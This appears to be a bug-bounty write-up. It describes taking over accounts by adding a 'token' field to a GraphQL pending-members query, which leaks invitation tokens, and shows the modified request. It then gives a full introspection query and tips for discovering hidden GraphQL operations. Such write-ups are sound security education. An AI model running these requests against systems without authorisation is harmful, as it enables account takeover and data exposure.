This is a classic case of thinking outside the "box." The app I targeted allowed Inviting users to your organization. When an invite is sent to the victim, they get a link like http://targetapp/invitation/{token}.

What was interesting was that the invitation link automatically logged a victim into their account and asked them if they wanted to accept the invitation.

🚨 This grabbed my attention, prompting the question, "Can I somehow acquire that Invitation token?" Considering its potential to let me take over any person's account, I immediately delved deeper into the app and came across a GraphQL operation for retrieving the list of invited users:
 
code[
    {"operationName":"GetPendingMembers",
     "variables":{"ID":"XXXX"},
      "query":"query GetPendingMembers($ID: ID!) {\n  users: GetPendingMembers(ID: $ID) {\n  invited {   email\n      role\n      createdAt\n      updatedAt\n      __typename\n    }\n    __typename\n  }\n}\n"}]

Looking at this, I thought, "What if the 'invited' object has more info than shown?" So, I added the \n token parameter Inside the invited object:

code[{"operationName":"GetPendingMembers","variables":{"ID":"XXXX"},"query":"query GetPendingMembers($ID: ID!) {\n  users: GetPendingMembers(ID: $ID) {\n  invited {\n token   email\n      role\n      createdAt\n      updatedAt\n      __typename\n    }\n    __typename\n  }\n}\n"}]

Surprisingly, it worked! The GraphQL operation returned the token that was sent to victims email. 

Crafted a URI with the leaked token, like http://targetapp/invitation/{token}, and took over the victim's account.


https://x.com/Jayesh25_/status/1733436057730072623?s=20

# 1️⃣ Retrieve the GraphQL Schema for hidden Queries/Mutations: 
If introspection is enabled, you can obtain the GraphQL Schema, revealing all GraphQL Operations and Mutations using the following GraphQL Query:

{"query":"{__schema{queryType{name}mutationType{name}subscriptionType{name}types{...FullType}directives{name description locations args{...InputValue}}}}fragment FullType on __Type{kind name description fields(includeDeprecated:true){name description args{...InputValue}type{...TypeRef}isDeprecated deprecationReason}inputFields{...InputValue}interfaces{...TypeRef}enumValues(includeDeprecated:true){name description isDeprecated deprecationReason}possibleTypes{...TypeRef}}fragment InputValue on __InputValue{name description type{...TypeRef}defaultValue}fragment TypeRef on __Type{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name ofType{kind name}}}}}}}}"}

# Introspection Disabled? Don't worry; here are some more ideas that can help you uncover those hidden GraphQL Queries/Mutations:

1️⃣ JavaScript - Retrieve GraphQL Queries and Mutations from JavaScript files when introspection is disabled. These files may list hidden methods not accessible via the app's regular functionality. Try making direct requests to these.

2️⃣ GraphQL Operation discovery via Brute Force - Clairvoyance is an excellent tool that helps obtain the GraphQL API schema via brute force even if introspection is disabled. It produces the GraphQL schema in JSON format. You can install the tool at https://github.com/nikitastupin/clairvoyance.

3️⃣ View the Schema and Continue Testing - Upload the identified operations/schema to other tools such as GraphQL Voyager, InQL, or graphql-path-enum, and start testing for GraphQL-specific security issues.
